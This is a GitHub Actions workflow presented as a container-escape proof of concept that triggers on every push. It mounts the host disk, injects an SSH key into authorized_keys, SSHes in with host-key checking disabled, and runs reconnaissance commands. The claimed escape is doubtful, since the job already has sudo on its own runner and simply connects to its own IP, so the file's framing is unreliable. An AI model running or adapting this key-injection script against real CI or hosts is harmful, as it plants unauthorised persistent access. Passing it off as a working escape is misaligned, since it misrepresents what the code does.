name: github-actions-container-escape
run-name: Container Escape POC
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Escape and compromise host
        run: |
          # Mount host filesystem
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          
          # Generate SSH key
          ssh-keygen -t ed25519 -f /tmp/key -N ""
          
          # Inject SSH key into host
          sudo mkdir -p /mnt/host/home/runner/.ssh
          sudo cp /tmp/key.pub /mnt/host/home/runner/.ssh/authorized_keys
          sudo chown -R 1001:1001 /mnt/host/home/runner/.ssh
          sudo chmod 700 /mnt/host/home/runner/.ssh
          sudo chmod 600 /mnt/host/home/runner/.ssh/authorized_keys
          
          # Get host IP
          HOST_IP=$(hostname -I | awk '{print $1}')
          
          # SSH to host and run commands
          ssh -i /tmp/key -o StrictHostKeyChecking=no runner@$HOST_IP << 'EOF'
          echo "=== CONTAINER ESCAPED TO HOST ==="
          whoami
          hostname
          pwd
          cd ../../../../.. && ls
          cd ../../../../../../.. && cd home && ls
          lsblk
          EOF
